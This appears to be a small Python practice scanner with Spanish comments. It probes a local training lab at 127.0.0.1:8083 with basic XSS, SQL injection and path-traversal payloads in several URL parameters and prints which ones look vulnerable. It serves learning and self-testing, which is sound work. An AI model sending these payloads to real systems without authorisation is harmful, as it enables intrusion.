import requests

URL = "http://127.0.0.1:8083"
print(f"[+] Escaneando {URL}\n")

# Debes tener UNO de tus labs corriendo en 8083
# XSS, SQLi o LFI - el scanner probará los 3

payloads = {
    "XSS": "<script>alert(1)</script>",
    "SQLi": "1 OR 1=1",
    "LFI": "../secreto"
}

for tipo, payload in payloads.items():
    try:
        # prueba en?page=,?q=,?id=
        for param in ["page", "q", "id"]:
            r = requests.get(f"{URL}/?{param}={payload}", timeout=2)
            if "secreto" in r.text.lower() or "bienvenido al" in r.text.lower() or payload in r.text:
                if "bloqueado" not in r.text.lower():
                    print(f"[!] Posible {tipo} con?{param}={payload}")
                    print(f" -> {r.url} ({len(r.text)} bytes)")
        print(f"[-] Pruebas {tipo} terminadas")
    except Exception as e:
        print(f"[x] No pude conectar a {URL} - ¿Está corriendo el lab? Error: {e}")
        break

print("\n[+] Scan terminado")
